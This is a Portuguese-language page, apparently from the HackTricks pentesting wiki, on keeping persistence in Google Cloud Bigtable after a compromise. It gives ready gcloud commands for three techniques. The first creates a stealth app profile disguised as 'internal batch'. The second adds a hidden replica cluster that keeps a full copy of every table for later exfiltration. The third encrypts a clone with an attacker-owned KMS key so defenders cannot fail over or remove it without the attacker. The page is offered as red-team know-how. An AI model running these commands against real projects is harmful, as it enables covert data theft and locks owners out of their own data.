# GCP - Bigtable Persistência

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Para mais informações sobre o Bigtable confira:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Perfil de App dedicado ao atacante

**Permissões:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Crie um app profile que roteie o tráfego para seu replica cluster e habilite o Data Boost, assim você nunca dependerá de provisioned nodes que defensores possam perceber.

<details>

<summary>Criar app profile furtivo</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Enquanto esse perfil existir você pode reconectar usando credenciais novas que o referenciam.

### Mantenha seu próprio cluster de réplica

**Permissões:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Provisione um cluster com contagem mínima de nós em uma região tranquila. Mesmo que suas identidades de cliente desapareçam, **o cluster mantém uma cópia completa de cada tabela** até que os defensores a removam explicitamente.

<details>

<summary>Criar cluster de réplica</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Monitore-o através de `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` para poder escalá-lo instantaneamente quando precisar puxar dados.

### Bloqueie a replicação com seu próprio CMEK

**Permissões:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` on the attacker-owned key.

Traga sua própria chave KMS ao criar um clone. Sem essa chave, Google não consegue recriar nem executar failover no cluster, então blue teams precisam coordenar com você antes de intervir.

<details>

<summary>Criar cluster protegido por CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Rotacione ou desative a chave no seu projeto para inutilizar instantaneamente a réplica (ainda permitindo que você a reative depois).

{{#include ../../../banners/hacktricks-training.md}}
